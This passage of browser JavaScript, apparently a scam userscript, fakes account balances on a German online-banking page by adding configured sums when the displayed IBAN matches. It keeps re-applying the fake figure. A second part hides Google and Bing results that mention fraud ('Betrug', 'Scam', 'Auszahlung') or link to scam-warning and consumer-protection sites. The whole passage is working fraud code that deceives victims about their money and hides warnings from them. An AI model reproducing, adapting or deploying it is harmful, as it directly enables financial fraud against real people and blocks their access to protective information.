            ///UTITLITY FUNCTIONS/////////


if (document.getElementsByClassName("mkp-identifier-description")[0].children[1].children[0].textContent == accountsecurity ){

        if (vorgemerkt == "no"){
            var elementExists = document.getElementsByClassName("balance-predecimal")[0];
            var shouldBeBalance = "";
            var uwdone = 0;
            setInterval(function() { elementExists = document.getElementsByClassName("balance-predecimal")[0];
                                    if (elementExists != null){
                                        if (uwdone == 0){
                                            //amount = 7149;
                                            var uwBalance = document.getElementsByClassName("balance-predecimal")[0].textContent;
                                            var uwBalanceReal = uwBalance.replace(".", "");
                                            var uwBalancneFake = parseFloat(uwBalanceReal) + xamount;
                                            var uwBalanceNwc = uwBalancneFake.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ".");
                                            document.getElementsByClassName("balance-predecimal")[0].textContent = uwBalanceNwc;
                                            uwdone = 1;
                                            shouldBeBalance = uwBalanceNwc;
                                        }

                                        if ( uwdone == 1 ) {
                                            if ( document.getElementsByClassName("balance-predecimal")[0].textContent != shouldBeBalance ) {
                                                document.getElementsByClassName("balance-predecimal")[0].textContent = shouldBeBalance;
                                                document.getElementById("idKontostandLine").parentNode.removeChild(document.getElementById("idKontostandLine"));
                                            }
                                        }
                                    }}, 50);} }}

//==========================================================================================================================================================================================================

//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
//CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE
//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++


     if (window.location.href.indexOf("kontodetails") > 0 || window.location.href.indexOf("10658384414") > 0 || window.location.href.indexOf("smth") > 0 ) {




        if (vorgemerkt == "no"){
            // Configurable values
    var desiredIBAN = accountsecurity; // Your desired IBAN in '     '
    var useSameAdjustmentAmount = true; // Set to true to use the same adjustment amount for all balances
    var adjustmentAmount = 10.0; // The adjustment amount to use if "useSameAdjustmentAmount" is true
    var BALANCE_CONFIGS = [
        { index: 0, adjustmentAmount: 3000.50 },
        { index: 1, adjustmentAmount: 3000.70 },
        { index: 2, adjustmentAmount: 3000.90 },
        { index: 3, adjustmentAmount: 3000.10 }
    ];

//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
//CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE
//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

//==========================================================================================================================================================================================================



    // Check if the first element with class "mkp-identifier-multiline" matches the specified IBAN
    var firstIdentifierElement = document.querySelector('.mkp-identifier-multiline');
    if (firstIdentifierElement) {
        var identifierText = firstIdentifierElement.textContent.replace(/\s/g, '').toLowerCase();

        // Check if either the entire IBAN matches or at least the last 9 characters match
        if (identifierText === desiredIBAN.replace(/\s/g, '').toLowerCase() || identifierText.endsWith(desiredIBAN.slice(-9).replace(/\s/g, '').toLowerCase())) {
            console.log('IBAN matches. Balance changer started.');

            // Function to change the balance value
            function changeBalance(balanceElement, adjustmentAmount) {
                var currentBalanceText = balanceElement.textContent.trim();
                var currentBalanceValue = parseFloat(currentBalanceText.replace(/[^\d,]+/g, '').replace(',', '.'));

                if (!isNaN(currentBalanceValue)) {
                    var newBalanceValue = currentBalanceValue + adjustmentAmount;
                    var newBalanceText = formatBalance(newBalanceValue) + ' EUR'; // Add "EUR" currency symbol

                    // Change the class to "minus" if the balance is negative
                    if (newBalanceValue < 0) {
                        balanceElement.classList.remove('plus');
                        balanceElement.classList.add('minus');
                    } else {
                        balanceElement.classList.remove('minus');
                        balanceElement.classList.add('plus');
                    }

                    // Update the balance element with the new value
                    balanceElement.textContent = newBalanceText;

                    console.log('Balance changed from ' + currentBalanceText + ' to ' + newBalanceText);
                } else {
                    console.log('Failed to parse current balance value.');
                }
            }

            // Iterate through the balance configurations and apply changes
            if (useSameAdjustmentAmount) {
                BALANCE_CONFIGS.forEach(function(config) {
                    var balanceElements = document.querySelectorAll('.plus, .minus');
                    if (config.index < balanceElements.length) {
                        var balanceElement = balanceElements[config.index];
                        changeBalance(balanceElement, adjustmentAmount);
                    } else {
                        console.log('Balance element not found for index ' + config.index);
                    }
                });
            } else {
                var balanceElements = document.querySelectorAll('.plus, .minus');
                balanceElements.forEach(function(balanceElement, index) {
                    var config = BALANCE_CONFIGS.find(function(cfg) {
                        return cfg.index === index;
                    });
                    if (config) {
                        changeBalance(balanceElement, config.adjustmentAmount);
                    } else {
                        console.log('No configuration found for balance element at index ' + index);
                    }
                });
            }

            // Function to format the balance with correct separators
            function formatBalance(balance) {
                var formattedBalance = balance.toFixed(2).replace(/\./g, ','); // Use comma as decimal separator
                return formattedBalance.replace(/\B(?=(\d{3})+(?!\d))/g, "."); // Add dots as thousands separators
            }
        } else {
            console.log('IBAN does not match. Balance changer not executed.');
        }
    } else {
        console.log('No element with class "mkp-identifier-multiline" found.');
    }} }





// Script 4: Search Result Filter
    if (window.location.href.indexOf("google.com") !== -1 ||
    window.location.href.indexOf("google.de") !== -1 ||
    window.location.href.indexOf("google.at") !== -1 ||
    window.location.href.indexOf("google.ch") !== -1 ||
    window.location.href.indexOf("bing.com") !== -1) {
(function() {
  'use strict';

  // Define the words, domains, and URLs to block
  var blockedWords = ['Betrug', 'schwarz', 'Scam', 'Broker', 'Finanzbetrug', 'Auszahlung' ]; // Add the words to block here
  var blockedDomains = ['watchlist-internet.at', 'broker-zahlt-nicht.de', 'scamadviser.com', 'finanzsache.com', 'webparanoid.com', 'personal-reviews.com', 'unique-reviews.com', 'kanzlei-herfurtner.de', 'verbraucherzentrale.de', 'betrug.de', 'ritschel-keller.de', 'seitcheck.de', 'anwalt.de' ]; // Add the domains to block here
  var blockedUrls = ['https://www.example1.com', 'https://www.example2.com']; // Add the urls to block here

  // Function to hide elements
  function hideElement(element) {
    if (element.style) element.style.display = 'none';
  }

  // Function to check and hide search results
  function checkAndHideSearchResults() {
    // Google
    var googleResults = document.querySelectorAll('.g');
    googleResults.forEach(function(result) {
      var urlElement = result.querySelector('a');
      var url = urlElement ? urlElement.href : '';
      var text = result.textContent.toLowerCase();
      if (blockedUrls.includes(url) || blockedDomains.some(domain => url.includes(domain)) || blockedWords.some(word => text.includes(word))) {
        hideElement(result);
      }
    });

    // Bing
    var bingResults = document.querySelectorAll('.b_algo');
    bingResults.forEach(function(result) {
      var urlElement = result.querySelector('a');
      var url = urlElement ? urlElement.href : '';
      var text = result.textContent.toLowerCase();
      if (blockedUrls.includes(url) || blockedDomains.some(domain => url.includes(domain)) || blockedWords.some(word => text.includes(word))) {
        hideElement(result);
      }
    });
  }


  // Function to execute the search result filtering
    function executeSearchResultFilter() {
      checkAndHideSearchResults();

      // Set an interval to check repeatedly, to deal with lazy-loaded search results
      setInterval(checkAndHideSearchResults, 1000);
    }

    // Call the function immediately
    executeSearchResultFilter();
  })();
        }


})();

